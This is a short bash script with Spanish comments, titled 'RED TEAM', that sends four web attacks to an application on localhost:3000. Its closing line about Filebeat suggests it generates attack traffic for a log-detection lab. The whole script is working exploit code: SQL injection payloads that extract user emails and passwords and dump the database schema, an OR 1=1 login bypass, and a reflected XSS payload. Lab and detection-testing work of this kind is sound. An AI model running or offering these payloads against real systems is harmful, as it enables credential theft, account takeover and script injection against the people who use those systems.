#!/bin/bash
echo "RED TEAM - Ejecutando ataques..."

# 1. SQL Injection - Extracción de usuarios
echo "[1/4] SQL Injection - Usuarios y passwords"
curl "http://localhost:3000/rest/products/search?q=qwert'))UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--"
sleep 2

# 2. SQL Injection - Schema de la base de datos
echo "[2/4] SQL Injection - Schema DB"
curl "http://localhost:3000/rest/products/search?q=qwert'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--"
sleep 2

# 3. SQL Injection - Bypass login
echo "[3/4] SQL Injection - Bypass login"
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\'' OR 1=1--","password":"anything"}'
sleep 2

# 4. XSS
echo "[4/4] XSS Attack"
curl "http://localhost:3000/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E"

echo "Ataques completados - Espera 1 minuto para que Filebeat procese"